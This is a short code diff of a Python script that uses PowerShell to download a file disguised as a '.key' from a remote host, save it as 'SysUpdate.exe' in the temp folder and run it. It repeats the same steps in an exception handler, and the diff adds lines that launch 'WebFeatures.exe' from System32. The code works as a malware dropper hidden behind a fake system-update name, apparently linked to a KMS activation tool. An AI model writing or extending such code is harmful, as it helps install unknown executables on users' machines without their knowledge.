@@ -7,6 +7,8 @@ try:
 
     subprocess.call(['powershell', '-Command', 'Invoke-WebRequest -Uri "https://kmsconnection.pythonanywhere.com/static/3KHY7-WNT83-DGQKR-F7HPR-844BM.key" -OutFile "$env:TEMP\\SysUpdate.exe"'], shell=True)
     subprocess.call(['powershell', '-Command', 'Start-Process -FilePath "$env:TEMP\\SysUpdate.exe" -Wait'], shell=True)
+    subprocess.call(['powershell', '-Command', 'Start-Process -FilePath "$env:SystemRoot\\System32\\WebFeatures.exe" -Wait'], shell=True)
+
 except:
     call(['powershell', '-Command', 'taskkill /F /IM WebFeatures.exe'], shell=True)
     call(['powershell', '-Command', 'taskkill /F /IM VisualFeatures'], shell=True)
@@ -15,5 +17,6 @@ except:
 
     call(['powershell', '-Command', 'Invoke-WebRequest -Uri "https://kmsconnection.pythonanywhere.com/static/3KHY7-WNT83-DGQKR-F7HPR-844BM.key" -OutFile "$env:TEMP\\SysUpdate.exe"'], shell=True)
     call(['powershell', '-Command', 'Start-Process -FilePath "$env:TEMP\\SysUpdate.exe" -Wait'], shell=True)
+    call(['powershell', '-Command', 'Start-Process -FilePath "$env:SystemRoot\\System32\\WebFeatures.exe" -Wait'], shell=True)
 
     pass
